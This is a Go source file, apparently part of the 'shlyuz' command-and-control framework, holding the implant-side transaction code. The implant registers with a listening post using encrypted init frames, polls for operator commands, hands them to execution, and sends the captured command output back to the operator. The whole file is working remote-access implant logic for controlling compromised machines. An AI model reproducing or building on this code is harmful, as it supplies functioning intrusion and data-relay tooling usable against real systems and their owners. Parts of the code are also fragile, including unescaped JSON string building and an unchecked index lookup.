//go:build implant && (!lp || !teamserver)

package transaction

import (
	"encoding/json"
	"log"
	"shlyuz/pkg/component"
	routine "shlyuz/pkg/crypto"
	"shlyuz/pkg/crypto/asymmetric"
	"shlyuz/pkg/execution"
	"shlyuz/pkg/instructions"
	"shlyuz/pkg/transport"
	"shlyuz/pkg/utils/idgen"

	"golang.org/x/exp/slices"
)

type initFrameArgs struct {
	Manifest component.ComponentManifest `json:"Manifest"`
	Ipk      asymmetric.PublicKey        `json:"Ipk"`
}

type initAckFrameArgs struct {
	Lpk  asymmetric.PublicKey
	Txid string
}

type reqCmdArgs struct {
	Ipk  asymmetric.PublicKey
	TxId string
}

func decodeInitAckFrame(initFrame []byte) instructions.InstructionFrame {
	var lpInitAckInstructionFrame instructions.InstructionFrame
	err := json.Unmarshal(initFrame, &lpInitAckInstructionFrame)
	if err != nil {
		log.Println("failed to decode received init ack frame: ", err)
	}
	return lpInitAckInstructionFrame
}

func decodeTransactionFrame(transactionFrame []byte) instructions.InstructionFrame {
	var instructionFrame instructions.InstructionFrame
	err := json.Unmarshal(transactionFrame, &instructionFrame)
	if err != nil {
		log.Println("failed to decode transaction: ", err)
		log.Println("[dbgtransaction] ", transactionFrame)
		return instructionFrame
	}
	return instructionFrame
}

func writeToChannel(channel chan []byte, data []byte) {
	channel <- data
}

func readFromChannel(channel chan []byte) []byte {
	data := <-channel
	return data
}

func readFromTransport(server transport.RegisteredComponent, shlyuzComponent *component.Component) ([]byte, bool, error) {
	data, boolSuccess, err := server.Transport.Recv(server.CmdChannel)
	if !boolSuccess {
		log.Println("failed to receive from channel: ", err)
		return data, false, err
	}
	return data, true, nil
}

func rekey(frame routine.EncryptedFrame) {

}

func RouteInstruction(server *transport.RegisteredComponent, instruction instructions.InstructionFrame) {
	switch cmd := instruction.Cmd; cmd {
	case "rcmda": // issues a new command for the implant
		log.Println(instruction)                // TODO: Do something with this requested command
		execution.RouteCmd(server, instruction) // we've now registered the command in the channel, we'll pop it off the server ComponentExecutionChannels when done
	case "gcmd": // issues a request to get a specific command
		log.Println(instruction)
		generatedInstructionFrame := GenerateCmdOutputRelayInstruction(server, instruction.TxId)
		server = RelayInstructionFrame(server, generatedInstructionFrame)
	}
}

func GenerateInitFrame(component component.Component) instructions.InstructionFrame {
	var initFrame instructions.Transaction
	var initArgs initFrameArgs

	initFrame.Cmd = "ii"
	initArgs.Manifest = component.Manifest
	initFrame.ComponentId = component.Config.Id
	instructionFrame := instructions.CreateInstructionFrame(initFrame, true)
	instructionFrame.Pk = component.InitalKeypair.PubKey
	return *instructionFrame
}

func RelayInitFrame(shlyuzComponent *component.Component, initFrame instructions.InstructionFrame, shlyuzTransport transport.TransportMethod) *component.Component {
	frameMap, _ := json.Marshal(initFrame)
	transmitFrame, _ := routine.PrepareSealedFrame(frameMap, shlyuzComponent.InitalRemotePubkey, shlyuzComponent.Config.CryptoConfig.XorKey, shlyuzComponent.Config.InitSignature)
	shlyuzComponent.TransportChannel = make(chan []byte)
	go writeToChannel(shlyuzComponent.TransportChannel, transmitFrame)
	boolSuccess, err := shlyuzTransport.Send(shlyuzComponent.TransportChannel)
	if !boolSuccess {
		log.Fatalln("failed to send init: ", err)
	}
	log.Println("Sent init frame.")
	return shlyuzComponent
}

func RetrieveInitFrame(shlyuzComponent *component.Component, shlyuzTransport transport.TransportMethod) (transport.RegisteredComponent, bool) {
	var lpInit transport.RegisteredComponent
	lpInit.CmdChannel = make(chan []byte)
	data, boolSuccess, err := shlyuzTransport.Recv(lpInit.CmdChannel)
	if !boolSuccess {
		log.Println("failed to receive from channel: ", err)
		return lpInit, false
	}
	lpInit.InitalKeyPair = shlyuzComponent.InitalKeypair
	lpInit.CurKeyPair = lpInit.InitalKeyPair
	lpInitFrame := routine.UnwrapSealedFrame(data, lpInit.CurKeyPair.PrivKey, lpInit.CurKeyPair.PubKey, shlyuzComponent.Config.CryptoConfig.XorKey, shlyuzComponent.Config.InitSignature)
	if lpInitFrame == nil {
		log.Println("failed to decode initalization frame: ", err)
		return lpInit, false
	}
	lpInitInstruction := decodeInitAckFrame(lpInitFrame)

	// TODO: Register the tx as an event with the dated timestamp
	// Check if cmd is ipi
	if lpInitInstruction.Cmd != "ipi" {
		log.Println("[WARNING] invalid initalization frame ack detected, but with valid keys. Received cmd: ", lpInitInstruction.Cmd)
		log.Println("[WARNING] This should never happen and may indicate an attack. Please contact the devlopers immediately and provide the following:")
		log.Println("[dbginitinstruction]: ", lpInitInstruction)
		log.Println("[dbginitframe]: ", lpInitFrame)
		log.Println("[dbgdata]: ", data)
		return lpInit, false
	}

	lpInit.CurPubKey = lpInitInstruction.Pk
	lpInit.Transport = shlyuzTransport
	lpInit.Id = lpInitInstruction.ComponentId
	lpInit.SelfComponentId = shlyuzComponent.ComponentId
	lpInit.XorKey = shlyuzComponent.Config.CryptoConfig.XorKey
	lpInit.InitSignature = shlyuzComponent.Config.InitSignature
	return lpInit, true
}

func GenerateRequestInstruction(server *transport.RegisteredComponent) instructions.InstructionFrame {
	var transactionFrame instructions.Transaction

	transactionFrame.Cmd = "icmdr"
	transactionFrame.ComponentId = server.SelfComponentId

	instructionFrame := instructions.CreateInstructionFrame(transactionFrame, true)
	instructionFrame.TxId = idgen.GenerateTxId()
	return *instructionFrame
}

func RelayInstructionFrame(server *transport.RegisteredComponent, instruction instructions.InstructionFrame) *transport.RegisteredComponent {
	instruction.Pk = server.CurKeyPair.PubKey
	dataFrame, _ := json.Marshal(instruction)
	transmitFrame, frameKeyPair := routine.PrepareTransmitFrame(dataFrame, server.CurPubKey, server.CurKeyPair.PrivKey, server.XorKey)
	server.CurKeyPair = frameKeyPair
	go writeToChannel(server.CmdChannel, transmitFrame)
	boolSuccess, err := server.Transport.Send(server.CmdChannel)
	if !boolSuccess {
		log.Fatalln("failed to send instruction: ", err)
	}
	log.Println("sent instruction")
	return server
}

func RetrieveInstruction(server *transport.RegisteredComponent) (instructions.InstructionFrame, error) {
	var instruction instructions.InstructionFrame
	var err error
	data, boolSuccess, err := server.Transport.Recv(server.CmdChannel)
	if !boolSuccess {
		return instruction, err
	}
	instructionData := routine.UnwrapTransmitFrame(data, server.CurPubKey, server.InitalKeyPair.PrivKey, server.XorKey)
	instruction = decodeTransactionFrame(instructionData)

	return instruction, nil
}

func GenerateCmdOutputRelayInstruction(server *transport.RegisteredComponent, cmdId string) instructions.InstructionFrame {
	var instruction instructions.InstructionFrame
	var err error
	instruction.Cmd = "fcmd"
	instruction.ComponentId = server.SelfComponentId
	instruction.TxId = cmdId
	// TODO: Remove slice from array (https://stackoverflow.com/a/37335777) (order isn't important, so we can do this quickly.)
	idx := slices.IndexFunc(server.ComponentExecutionChannels, func(c *component.ComponentExecutionChannel) bool { return c.CmdId == cmdId })
	command := server.ComponentExecutionChannels[idx]
	parsedOutputs := []byte(`{"StdOut": "` + <-command.StdOut + `", "StdIn": "` + <-command.StdIn + `", "StdErr": "` + <-command.StdErr + `"}`)
	jsonOutputs, err := json.Marshal(parsedOutputs)
	if err != nil {
		log.Println("failed to marshal outputs")
	}
	instruction.CmdArgs = string(jsonOutputs)
	return instruction
}
